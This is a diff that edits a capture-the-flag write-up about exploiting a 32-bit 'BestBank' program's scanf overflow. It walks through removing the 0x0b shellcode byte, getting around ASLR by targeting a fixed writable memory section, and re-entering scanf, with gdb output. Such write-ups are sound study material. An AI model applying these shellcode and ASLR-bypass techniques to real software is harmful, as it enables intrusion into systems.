@@ -616,7 +616,7 @@ Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab accordi
 
 ### Step 6: Circumvent Scanf's `0x0b` Limitation
 
-The `scanf` function stops scanning at byte `0x0b` likely because `0x0b` is considered as a terminating character. Therefore, this byte must be removed from the payload. And the question becomes: how to deliver the same payload without byte `0x0b`?
+The `scanf` function stops scanning at byte `0x0b` likely because `0x0b` is considered a terminating character. Therefore, this byte must be removed from the payload. And the question becomes: how to deliver the same payload without byte `0x0b`?
 
 First, examine what that byte is doing. Take a look at the shellcode again:
 ```
@@ -718,7 +718,7 @@ Breakpoint 1, 0x08048060 in _start ()
    0x8048064 <_start+4>:    mov    eax,0x1
 ```
 
-From the first instruction to the next is a difference of two bytes from `0x8048060 <_start>` to `0x8048062 <_start+2>`. The same is true for the second to third instructions. Therefore, both `mov al,0xff` and `sub al,0xf4` instructions are two bytes long. Inspect two bytes from `eip` at those intervals to view the opcodes:
+From the first instruction at `0x8048060 <_start>` to the next at `0x8048062 <_start+2>` is a difference of two bytes. The same is true for the second to third instructions. Therefore, both `mov al,0xff` and `sub al,0xf4` instructions are two bytes long. Inspect two bytes from `eip` at those intervals to view the opcodes:
 ```
 (gdb) x/2bx $eip
 0x8048060 <_start>:     0xb0    0xff
@@ -734,7 +734,7 @@ mov al,0xff     0xb0 0xff
 sub al,0xf4     0x2c 0xf4
 ```
 
-### Step 7: Execute Shell (Exploit Version 2)
+### Step 7: Execute a Shell (Exploit Version 2)
 
 Now with the `scanf` byte `0xb` circumvention tactics in hand, create a new [exploit script](exploit2.py) to take advantage of this new information. Remove the `b0 0b` bytes from the original shell code and add in the `mov` and `sub` opcodes:
 ```python
@@ -810,15 +810,7 @@ Enter input as normal in the bank's terminal window until the breakpoint hits in
 esp            0xffa73dd0   0xffa73dd0
 ```
 
-This `0xffa73dd0` address is far off from the predicted `0xffffdd6c` address used in the payload. Why is it so different? This difference is due to [Address Space Layout Randomization (ASLR)][9]. Therefore, the stack address used in gdb cannot be used in a live program. Furthermore, gdb has ASLR turned off by default for easier debugging. To turn ASLR on, use this command:
-```
-(gdb) set disable-randomization off
-```
-
-To turn ASLR back off (default setting), use this:
-```
-(gdb) set disable-randomization on
-```
+This `0xffa73dd0` address is far off from the predicted `0xffffdd6c` address used in the payload. Why is it so different? This difference is due to [Address Space Layout Randomization (ASLR)][9]. Therefore, the stack address found in gdb (`0xffffdd6c`) cannot be used in a live program. Furthermore, gdb has ASLR turned off by default for easier debugging ([set disable-randomization][23]).
 
 ### Step 8: Inspect Program Security with Checksec and Proc Maps
 
@@ -845,22 +837,23 @@ $ cat /proc/28447/maps
 
 The output looks similar to this. The column headers are added for convenience.
 ```
-Start    End Addr RWX? Offset                                            Location/Description
-08048000-0804b000 r-xp 00000000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
-0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
-0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
-f7d93000-f7f68000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f68000-f7f69000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f69000-f7f6b000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
-f7f6b000-f7f6c000 rwxp 001d7000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+Start    End Addr RWX? Offset                    Location/Description
+-------- -------- ---- --------                  --------------------
+08048000-0804b000 r-xp 00000000 fd:01 2441960    /lhc/Pwn/BestBank/bank
+0804b000-0804c000 r-xp 00002000 fd:01 2441960    /lhc/Pwn/BestBank/bank
+0804c000-0804d000 rwxp 00003000 fd:01 2441960    /lhc/Pwn/BestBank/bank
+f7d93000-f7f68000 r-xp 00000000 fd:01 8130741    /lib/i386-linux-gnu/libc-2.27.so
+f7f68000-f7f69000 ---p 001d5000 fd:01 8130741    /lib/i386-linux-gnu/libc-2.27.so
+f7f69000-f7f6b000 r-xp 001d5000 fd:01 8130741    /lib/i386-linux-gnu/libc-2.27.so
+f7f6b000-f7f6c000 rwxp 001d7000 fd:01 8130741    /lib/i386-linux-gnu/libc-2.27.so
 f7f6c000-f7f6f000 rwxp 00000000 00:00 0 
 f7f8b000-f7f8d000 rwxp 00000000 00:00 0 
-f7f8d000-f7f90000 r--p 00000000 00:00 0                                  [vvar]
-f7f90000-f7f91000 r-xp 00000000 00:00 0                                  [vdso]
-f7f91000-f7fb7000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-f7fb7000-f7fb8000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-f7fb8000-f7fb9000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
-ff850000-ff871000 rwxp 00000000 00:00 0                                  [stack]
+f7f8d000-f7f90000 r--p 00000000 00:00 0          [vvar]
+f7f90000-f7f91000 r-xp 00000000 00:00 0          [vdso]
+f7f91000-f7fb7000 r-xp 00000000 fd:01 8130737    /lib/i386-linux-gnu/ld-2.27.so
+f7fb7000-f7fb8000 r-xp 00025000 fd:01 8130737    /lib/i386-linux-gnu/ld-2.27.so
+f7fb8000-f7fb9000 rwxp 00026000 fd:01 8130737    /lib/i386-linux-gnu/ld-2.27.so
+ff850000-ff871000 rwxp 00000000 00:00 0          [stack]
 ```
 
 A process's proc map can also be viewed in gdb with this command:
@@ -872,11 +865,9 @@ Run the bank program a few more times and print its proc map again. Notice that 
 
 ### Step 9: Jump to Scanf (Exploit Version 3)
 
-The payload cannot reliably jump back to the stack due to ASLR. Therefore, it has to write to and jump back to a reliable location in memory, like section `0804c000-0804d000`. 
+The payload cannot reliably jump back to the stack due to ASLR. Therefore, the payload has to write to and jump back to a non-moving and writable location in memory, like section `0804c000-0804d000`. Can the payload manipulate `scanf` to write to any location like `0804c000`? Yes, it can.
 
-Now that section `0804c000-0804d000` is exposed as vulnerable, just need to write the payload to that location and jump to it. However, the payload writes to the stack first due to the program itself. But what if first took control of the program with one payload and then jumped back to scanf with a second craft exploit that will write to the desired vulnerable section. This can work.
-
-Will need to drill down into how scanf works. From Ghidra's decompiled C code [bank.c](bank.c), 
+First, drill down and understand how `scanf` works. Take another look at the `captcha` function from Ghidra's decompiled code:
 ```c
 uint captcha(void) {}
     ...
@@ -886,9 +877,10 @@ uint captcha(void) {}
 }
 ```
 
-Set a breakpoint at the `printf` function (because its right before the scanf).
+Notice the `printf` statement occurs right before the `scanf` function call. This is a good place to set a breakpoint in order to see the instructions leading up to the `scanf` call.
 
-Stop at the instruction just after the printf completes:
+
+Set a breakpoint at the `printf` function. Step passed the captcha and stop at the instruction just after `printf` completes (`0x8049208: add esp,0x10`):
 ```
  _    _____    _____ _       _          _  __
 | |__|___ / __|_   _| |__   / \   _ __ | |/ /
@@ -914,23 +906,23 @@ Captcha: => 0x8049208:  add    esp,0x10
 (gdb) 
 ```
 
-Which is instruction 0x8049208. Set a breakpoint at 0x8049208. Examine 10 instructions from 0x8049208.
+Examine 10 instructions from `0x8049208`. Note the comments after semi-colons that point out input save location and the `%s` [format string][1]:
 ```
 (gdb) x/10i $eip
 => 0x8049208:   add    esp,0x10
    0x804920b:   sub    esp,0x8
-   0x804920e:   lea    eax,[ebp-0x3f4]      ; 0x3f4 = 1012, likely the location to store the captcha input
+   0x804920e:   lea    eax,[ebp-0x3f4]   ; 0x3f4 = 1012, location to save captcha input
    0x8049214:   push   eax
-   0x8049215:   lea    eax,[ebx-0x1f09]     ; 
-   0x804921b:   push   eax
-   0x804921c:   call   0x8049080 <__isoc99_scanf@plt>
-   0x8049221:   add    esp,0x10
-   ...
-(gdb) x/s $ebx-0x1f09
+   0x8049215:   lea    eax,[ebx-0x1f09]  ; "%s"  ------------.
+   0x804921b:   push   eax                                   |
+   0x804921c:   call   0x8049080 <__isoc99_scanf@plt>        |
+   0x8049221:   add    esp,0x10                              |
+   ...                                                       |
+(gdb) x/s $ebx-0x1f09    <-----------------------------------'
 0x804a0f7:  "%s"
 ```
 
-Placeholder
+### STOPPED HERE
 ```
 CALL actually does this for you for example
 CALL my_func
@@ -1056,6 +1048,7 @@ Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020.
 * [Ahmed Demiai: Reversing Stripped ELF with GDB 64-Bit][20]
 * [GeeksforGeeks: How to compile 32-bit program on 64-bit in C and C++][21]
 * [StackOverflow: Substitutes for x86 assembly 'call' instruction?][22]
+* [StackOverflow: Disable ASLR in gdb][23]
 
 [1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
 [2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
@@ -1079,3 +1072,4 @@ Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020.
 [20]:https://youtu.be/pF_prX9ZEHg
 [21]:https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
 [22]:https://stackoverflow.com/questions/7060970/substitutes-for-x86-assembly-call-instruction
+[23]:https://stackoverflow.com/a/43944979/2179970
